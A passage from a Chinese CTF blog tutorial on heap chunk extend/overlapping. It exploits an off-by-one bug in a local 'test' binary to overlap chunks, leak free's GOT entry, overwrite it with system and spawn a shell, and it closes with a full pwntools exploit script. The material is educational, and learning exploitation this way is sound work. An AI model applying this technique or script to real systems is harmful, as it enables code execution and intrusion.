class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720170711370.png" alt="image-20230720170711370"></p>
<p>看一下堆的结构，堆是从0x603000开始的</p>
<p><img src="C:\Users\hubin\AppData\Roaming\Typora\typora-user-images\image-20230720171238392.png" alt="image-20230720171238392"></p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/1600258007510-fc2b387f-376e-4b83-8867-3ba1d7924d19.png" alt="img"></p>
<p>了解了堆内存布局，说一下思路</p>
<h4 id="触发off-by-one漏洞完成Extend"><a href="#触发off-by-one漏洞完成Extend" class="headerlink" title="触发off-by-one漏洞完成Extend"></a>触发off-by-one漏洞完成Extend</h4><p>可以看到两个结构体的content成员变量都指向内容chunk的data，我们回想一下在前面代码分析阶段发现修改功能存在off-by-one漏洞，那么怎么去利用呢？</p>
<ul>
<li>先从浅层看这个问题，我们修改的其实是heap内容的chunk而不是结构体本身的chunk，也就是说如果我们修改heap1的内容，如果触发off-by-one的话那影响的应该是heap2的结构体</li>
<li>再从深层看这个问题，在堆中如果低地址的块处于使用状态，那么相邻高地址的块的prev_size可以作为低地址块的data来使用</li>
</ul>
<p>把两个方面联系在一起：如果我们在申请heap_content的大小的时候范围涵盖下一个结构体的prev_size，那么在此修改heap_content的时候就会触发off-by-one漏洞，进而溢出的部分就会将相邻高地址的chunk的size给覆盖掉</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/1600329002654-98718dec-7cd8-4004-a684-bea0e8ef96a9.png" alt="QQ截图20200917154954.png"></p>
<p>我们试一下，重新使用gdb打开程序，这次我们第一个heap创建24个字节，在内容里写入24个字节的任意字符，第二个heap创建16个字节，然后ctrl + c回到调试界面，heap命令找到第一个chunk位置，x&#x2F;20gx + 地址查看一下：<br><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720171838277.png" alt="image-20230720171838277"></p>
<p>可以看到在heap1_content输入24个字节后将heap2结构体chunk的prev_size占满了，如果我们再一次修改heap1_content，写入25个字节后就会触发off-by-one漏洞将heap2结构体chunk的size覆盖掉。</p>
<p>实验一下，输入25个字符，aaaaaaaaaaaaaaaaaaaaaaaac</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720172226777.png" alt="image-20230720172226777"></p>
<p>chunk2块size字段果然被修改了。</p>
<p>那么既然我们可以通过这种方式改写size大小，就要好好设计一番，如果我们将size的值覆盖成0x41的话，在释放时heap2结构体chunk和heap2_content就会合并成一个0x40的块，重新申请之后就可以进一步操作了，先想好：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1<span class="number">.0</span> = <span class="number">24</span>个字节 + \x41</span><br></pre></td></tr></table></figure>

<p>其实前面的24个字节还是可以利用起来的，在代码分析阶段我们发现在释放heap的时候首先释放的是heap_content的指针，这个指针指向的其实是heap_content的chunk中的data起始地址，这个过程是由free()函数完成的，free()函数的参数就是heap_content的data起始地址。那么如果我么想办法将free()函数替换成system()函数，并且在修改堆块内容的时候将字符串&#x2F;bin&#x2F;sh放在最前面，那么&#x2F;bin&#x2F;sh字符串的地址就会作为free函数的参数，即&#x2F;bin&#x2F;sh字符串会作为system()函数的参数，在释放这个堆块的时候就可以拿shell了！！！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2<span class="number">.0</span> = <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span> + <span class="string">&quot;\x41&quot;</span></span><br></pre></td></tr></table></figure>

<p>&#x2F;bin&#x2F;sh\x00”字符串在data的起始位置，“aaaaaaaaaaaaaaaa” 用来占位”\x41”用来覆盖下一个heap_content的size，实际操作试一下：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/1600333777667-45329515-7dc8-42f8-8685-fc3ebc02b2fa.png" alt="QQ截图20200917170929.png"></p>
<p>再设置”\x41”,set  *0x603048&#x3D;0x41</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/1600333777667-45329515-7dc8-42f8-8685-fc3ebc02b2fa.png"></p>
<p>可以看到已经成功的部署好了&#x2F;bin&#x2F;sh字符串，并且将下一个heap2的size部分覆盖成了0x41。接下来的操作就和前面的原理一样了，我们需要释放掉heap2，也就是释放编号为1的heap。</p>
<p>释放chunk1’</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603060 ◂— 0x20f81		//chunk1 content</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x603040 ◂— 0x21		//chunk1 struct</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200903143451796.png" alt="img"></p>
<p>首先释放的应该是heap_content，接着释放的是heap结构体，所以会在fastbin中存在两个chunk地址。重点是在fastbin中0x40这条链表上挂了我们extend之后的chunk，这就证明已经成功使heap结构体chunk与heap内容chunk合并了。当我再次申请的时候就可以对被extent的chunk进行操作了</p>
<h4 id="泄露free-函数真实地址"><a href="#泄露free-函数真实地址" class="headerlink" title="泄露free()函数真实地址"></a>泄露free()函数真实地址</h4><p>经过前面一系列步骤完成了以下：</p>
<ul>
<li>将”&#x2F;bin&#x2F;sh”字符串部署在heap1内容chunk的data处</li>
<li>通过off-by-one漏洞完成修改heap2结构体chunk的size值</li>
<li>成功extent heap2内容chunk</li>
</ul>
<p>前面已经提到过，我们的计划是将free()函数替换成system()函数，这样一来我们部署好的“&#x2F;bin&#x2F;sh”字符串就可以作为system()函数的参数了。但是这个程序本身并没有system()函数，所以就需要泄露出某一个函数的got表地址，进而通过pwntools的工具来找出libc基地址，加上偏移之后找到system()函数。那么首先第一步就是泄露，因为这个程序本身就存在free()函数，那么就直接泄露free_got了</p>
<p>上一步我们已经将extent的0x40大小的chunk准备好了，这一步直接在操作流程中申请0x30个字节的堆块就可以直接调用了。这里有一个点需要注意，在创建堆块的时候实际上申请的是两个chunk：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720175010398.png" alt="image-20230720175010398"></p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720175024201.png" alt="image-20230720175024201"></p>
<p>首先申请的是结构体chunk，然后申请的是内容chunk。这个已经说过很多遍了是吧，但是这里要强调的是由于结构体是自定义的，整个结构体只需要0x20个字节就够可以了，所以在申请结构体chunk的时候首先会在fastbin中查找是否有合适大小的chunk可以使用。此时fastbin的0x20链表中挂着之前释放掉的heap2结构体内容chunk，所以刚刚好0x20个字节，这0x603060部分的空间就被启用了。接下来由于申请内容大小为0x30，所以fastbin的0x40链表中刚好有之前extent_chunk，所以0x603040这部分的空间就被启用了。</p>
<p>需要注意的是：<code>0x603060先被启用，0x603040后被启用</code>，这就意味着先被启用的0x20的chunk 会被0x40的chunk所覆盖！！！</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/1600337870008-03e11c86-d8b9-4425-b86c-28e424de2b2e.png" alt="QQ截图20200917181646.png"></p>
<p>请注意，绿色框中的chunk先被启用，红色框中的chunk后被启用，如果在红色chunk中写东西，绿色chunk就会被覆盖。</p>
<p>既然内容chunk可以覆盖结构体的content成员变量，那么我们将content成员变量的指针覆盖成free_got指针，然后再打印这个0x30的heap，这样一来打印的最终目的地就指向了free函数的真实地址了：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200904141431279.png" alt="img"></p>
<p>那么这样一来重新申请0x30heap的时候填写内容时payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">&#x27;free&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>接下来回到操作流程界面，我们打印一下这个0x30的heap，free函数地址就会被打印出来了，但是在接收打印出来的内容时需要处理一下：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200904142734299.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">data = sh.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line">free_addr = u64(data.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>

<h4 id="将free-函数替换成system-函数"><a href="#将free-函数替换成system-函数" class="headerlink" title="将free()函数替换成system()函数"></a>将free()函数替换成system()函数</h4><p>在得到了free()函数地址之后就可以用我们的老方法，先找到libc基地址，再加上system()函数偏移得到system()函数地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>这样一来就找到了system()函数，接下来就需要考虑的是怎么将free()函数地址替换成system()函数地址了。其实我们可以重新编辑0x30这个heap来实现对free_got中的内容：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200904143946479.png" alt="img"></p>
<p>在对内容进行修改时，依然还是修改heap结构体中content成员变量指向的free_got中的内容，所以我们再一次修改的时候就可以直接将free_got指向的free_addr修改成system_addr,即修改free_got表中的free函数真实地址为system函数地址。</p>
<p>因为调用free()函数的时候程序也是去free_got指向的位置找函数地址，那么这样一来在程序调用free()函数的时候实际上调用的确实system()函数了</p>
<ul>
<li>原执行流程：free(binsh_addr)</li>
<li>替换后执行流程：system(&#x2F;bin&#x2F;sh)</li>
</ul>
<p>所以当我们释放第一个heap的时候就可以拿shell了</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">heap = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">&quot;hollk&quot;</span>)  </span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&quot;hollk&quot;</span>)  </span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">&#x27;free&#x27;</span>]))  </span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">data = sh.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(hollk)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720182632540.png" alt="image-20230720182632540"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://zhuyuan1213.github.io">主元</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zhuyuan1213.github.io/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/">https://zhuyuan1213.github.io/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zhuyuan1213.github.io" target="_blank">zhuyuan's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/study/">study</a><a class="post-meta__tags" href="/tags/heap/">heap</a><a class="post-meta__tags" href="/tags/Chunk-Extend/">Chunk Extend</a><a class="post-meta__tags" href="/tags/Overlapping/">Overlapping</a></div><div class="post_share"><div class="social-share" data-image="https://w.wallhaven.cc/full/ex/wallhaven-exwgmr.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/07/24/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"><img class="prev-cover" src="https://w.wallhaven.cc/full/d6/wallhaven-d6wdl3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ELF文件格式</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/24/PWN-%E6%A0%88%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"><img class="next-cover" src="https://w.wallhaven.cc/full/zy/wallhaven-zy5omo.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN-栈保护机制</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/07/26/fastbin_attack%E7%BB%BC%E8%BF%B0/" title="fastbin_attack综述"><img class="cover" src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/wallhaven-3lrmm9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-26</div><div class="title">fastbin_attack综述</div></div></a></div><div><a href="/2023/07/24/unsortedbin%E7%9A%84unlink/" title="unsortedbin的unlink"><img class="cover" src="https://w.wallhaven.cc/full/3l/wallhaven-3lrqpy.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">unsortedbin的unlink</div></div></a></div><div><a href="/2023/07/24/%E5%A0%86-UAF%EF%BC%88Use%20After%20Free%EF%BC%89/" title="堆-UAF（Use After Free）"><img class="cover" src="https://w.wallhaven.cc/full/3l/wallhaven-3lrqpy.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">堆-UAF（Use After Free）</div></div></a></div><div><a href="/2023/07/24/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" title="堆中的off-by-one"><img class="cover" src="https://w.wallhaven.cc/full/w8/wallhaven-w8m9w7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">堆中的off-by-one</div></div></a></div><div><a href="/2023/07/24/%E5%A0%86%E5%85%A5%E9%97%A8%E6%A6%82%E8%BF%B0/" title="堆入门概述"><img class="cover" src="https://w.wallhaven.cc/full/ex/wallhaven-exwgw8.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">堆入门概述</div></div></a></div><div><a href="/2023/07/24/Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/" title="Canary保护机制以及常用绕过手段"><img class="cover" src="https://w.wallhaven.cc/full/we/wallhaven-wemdqr.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">Canary保护机制以及常用绕过手段</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">主元</div><div class="author-info__description">二进制ing</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zhuyuan1213/zhuyuan1213.github.io.git"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">献给热爱的一切~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Chunk-Extend-x2F-Overlapping-%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0"><span class="toc-number">1.</span> <span class="toc-text">Chunk Extend&#x2F;Overlapping | 堆拓展、重叠</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.0.1.</span> <span class="toc-text">参考资料</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E5%BF%85%E8%A6%81%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.0.3.</span> <span class="toc-text">漏洞利用的必要条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B1%EF%BC%9A%E5%AF%B9inuse%E7%9A%84fastbin%E8%BF%9B%E8%A1%8Cextend"><span class="toc-number">1.0.4.</span> <span class="toc-text">基本示例1：对inuse的fastbin进行extend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B-2%EF%BC%9A%E5%AF%B9-inuse-%E7%9A%84-smallbin-%E8%BF%9B%E8%A1%8C-extend"><span class="toc-number">1.0.5.</span> <span class="toc-text">基本示例 2：对 inuse 的 smallbin 进行 extend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B-3%EF%BC%9A%E5%AF%B9-free-%E7%9A%84-smallbin-%E8%BF%9B%E8%A1%8C-extend"><span class="toc-number">1.0.6.</span> <span class="toc-text">基本示例 3：对 free 的 smallbin 进行 extend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B-4%EF%BC%9A%E9%80%9A%E8%BF%87-extend-%E5%90%8E%E5%90%91-overlapping"><span class="toc-number">1.0.7.</span> <span class="toc-text">基本示例 4：通过 extend 后向 overlapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B-5%EF%BC%9A%E9%80%9A%E8%BF%87-extend-%E5%89%8D%E5%90%91-overlapping"><span class="toc-number">1.0.8.</span> <span class="toc-text">基本示例 5：通过 extend 前向 overlapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.0.9.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">1.0.9.1.</span> <span class="toc-text">检查保护机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.9.2.</span> <span class="toc-text">程序流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E7%95%8C%E9%9D%A2"><span class="toc-number">1.0.9.3.</span> <span class="toc-text">主界面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%A0%86"><span class="toc-number">1.0.9.4.</span> <span class="toc-text">创建一个堆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%BE%91%E4%B8%80%E4%B8%AA%E5%A0%86"><span class="toc-number">1.0.9.5.</span> <span class="toc-text">编辑一个堆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E4%B8%80%E4%B8%AA%E5%A0%86"><span class="toc-number">1.0.9.6.</span> <span class="toc-text">打印一个堆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E4%B8%80%E4%B8%AA%E5%A0%86"><span class="toc-number">1.0.9.7.</span> <span class="toc-text">删除一个堆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90struct%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.0.9.8.</span> <span class="toc-text">分析struct结构体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.9.9.</span> <span class="toc-text">漏洞函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwngdb%E8%B0%83%E8%AF%95"><span class="toc-number">1.0.9.10.</span> <span class="toc-text">pwngdb调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91off-by-one%E6%BC%8F%E6%B4%9E%E5%AE%8C%E6%88%90Extend"><span class="toc-number">1.0.9.11.</span> <span class="toc-text">触发off-by-one漏洞完成Extend</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2free-%E5%87%BD%E6%95%B0%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80"><span class="toc-number">1.0.9.12.</span> <span class="toc-text">泄露free()函数真实地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86free-%E5%87%BD%E6%95%B0%E6%9B%BF%E6%8D%A2%E6%88%90system-%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.9.13.</span> <span class="toc-text">将free()函数替换成system()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.0.10.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/07/26/fastbin_attack%E7%BB%BC%E8%BF%B0/" title="fastbin_attack综述"><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/wallhaven-3lrmm9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="fastbin_attack综述"/></a><div class="content"><a class="title" 